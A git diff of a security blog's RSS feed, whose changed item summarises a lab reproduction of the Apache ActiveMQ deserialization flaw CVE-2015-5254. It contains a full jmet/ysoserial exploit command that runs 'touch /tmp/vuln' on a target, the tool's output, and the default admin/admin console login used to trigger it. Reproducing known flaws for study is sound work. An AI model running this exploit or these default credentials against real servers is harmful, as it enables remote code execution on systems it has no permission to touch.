@@ -16,7 +16,7 @@
       <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
       
       <guid>https://oopsdc.github.io/post/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
-      <description>Web服务器漏洞 Apache Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。
+      <description>Web服务器漏洞 Apache ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。
 漏洞影响 Apache ActiveMQ 5.13.0之前的5.x版本。
 复现思路 1.构造(可使用ysoserial)可执行命令的序列化对象。
 2.作为一个消息，发送给目标61616端口。
@@ -25,7 +25,8 @@
  下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
 jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
  给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:
-java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.c.j.t.JMSTarget [main] Sent gadget &amp;#34;ROME&amp;#34; with command: &amp;#34;touch /tmp/vuln&amp;#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:&amp;lt;server-id&amp;gt; 访问http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event查看消息队列</description>
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.c.j.t.JMSTarget [main] Sent gadget &amp;#34;ROME&amp;#34; with command: &amp;#34;touch /tmp/vuln&amp;#34; INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:&amp;lt;server-id&amp;gt; 访问http://&amp;lt;ip&amp;gt;:8161/admin/browse.jsp?JMSDestination=event查看消息队列，访问页面需要登录，默认账密如下:
+admin/admin点击页面Message ID下的ID:server-id字段触发文件创建命令，在受害端查看命令是否执行成功:</description>
     </item>
     
     <item>
